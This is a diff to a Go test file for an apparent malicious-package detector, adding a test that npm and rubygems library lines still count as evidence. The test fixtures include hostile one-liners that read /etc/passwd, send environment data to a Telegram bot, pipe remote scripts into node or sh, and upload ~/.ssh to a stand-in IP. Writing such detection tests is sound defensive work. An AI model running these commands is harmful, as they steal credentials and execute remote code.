@@ -129,3 +129,21 @@ func TestSetupHostReconIsEvidence(t *testing.T) {
 		t.Error("git describe in setup.py must not mint")
 	}
 }
+
+// The demotion is per registry, because the measurement is. On npm and rubygems the same strings
+// are where the malware sits: of the npm packages carrying them, P-TELEGRAM-BOT 12 of 54,
+// P-PASSWD-READ 12 of 120 and G-PIPE-NODE 19 of 26 are OpenSSF-confirmed (pypi: 4%, 0.4%, none).
+func TestNpmAndRubygemsKeepTheseAsEvidenceInLibrarySource(t *testing.T) {
+	for _, tc := range []struct{ eco, line string }{
+		{"npm", `const pw = require('fs').readFileSync('/etc/passwd', 'utf8');`},
+		{"npm", `fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=1&text=" + env)`},
+		{"npm", `require('child_process').exec('curl -s http://203.0.113.9/x | node')`},
+		{"npm", `exec("tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in")`},
+		{"rubygems", `system("curl -s http://203.0.113.9/x.sh | sh")`},
+		{"rubygems", `File.read("/etc/passwd")`},
+	} {
+		if !libraryMints(tc.eco, tc.line) {
+			t.Errorf("%s library line should still mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+		}
+	}
+}
